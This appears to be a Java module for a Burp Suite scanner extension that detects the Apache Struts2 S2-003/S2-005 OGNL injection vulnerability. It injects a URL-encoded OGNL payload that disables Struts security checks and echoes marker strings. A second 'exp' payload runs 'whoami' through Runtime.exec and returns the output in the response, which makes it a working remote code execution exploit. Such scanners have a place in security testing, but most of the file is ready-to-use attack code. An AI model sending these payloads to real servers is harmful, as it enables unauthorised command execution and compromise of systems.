package module;

import burp.*;

import java.io.PrintWriter;
import java.net.URLEncoder;

public class S2_003_005 extends IModule {
    public S2_003_005() {
        poc =
            "(a)(('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(a))=1" +
            "&(b)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(b))=1" +
            "&(c)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(c))=1" +
            "&(d)(('\\u0023xman\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(d))=1" +
            "&(e)(('\\u0023xman.getWriter().print(\"" + injectMark[0] + "\")')(e))=1" +
            "&(f)(('\\u0023xman.getWriter().print(\"" + injectMark[1] + "\")')(f))=1" +
            "&(g)(('\\u0023xman.getWriter().flush()')(g))=1" +
            "&(h)(('\\u0023xman.getWriter().close()')(h))=1";
        poc = URLEncoder.encode(poc).replace("%3D", "=").replace("%26", "&");

        exp =
            "(a)(('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(a))=1" +
            "&(b)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(b))=1" +
            "&(c)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(c))=1" +
            "&(d)(('\\u0023mycmd\\u003d\\'whoami\\'')(d))=1" +
            "&(e)(('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(e))=1" +
            "&(f)(('\\u0023mydat\\u003dnew\\u0020java.io.DataInputStream(\\u0023myret.getInputStream())')(f))=1" +
            "&(g)(('\\u0023myres\\u003dnew\\u0020byte[51020]')(g))=1" +
            "&(h)(('\\u0023mydat.readFully(\\u0023myres)')(h))=1" +
            "&(i)(('\\u0023mystr\\u003dnew\\u0020java.lang.String(\\u0023myres)')(i))=1" +
            "&(j)(('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(j))=1" +
            "&(k)(('\\u0023myout.getWriter().print(\\u0023mystr)')(k))=1";
        exp = URLEncoder.encode(exp).replace("%3D", "=").replace("%26", "&");
    }

    @Override
    public IScanIssue start() {
        String[] parameters = poc.split("&");

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        for (String parameter: parameters) {
            String[] split = parameter.split("=");
            String parameterName = split[0];
            String parameterValue = split[1];
            IParameter newParameter = helpers.buildParameter(parameterName, parameterValue, in);
            request = helpers.updateParameter(request, newParameter);
        }
        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }
}
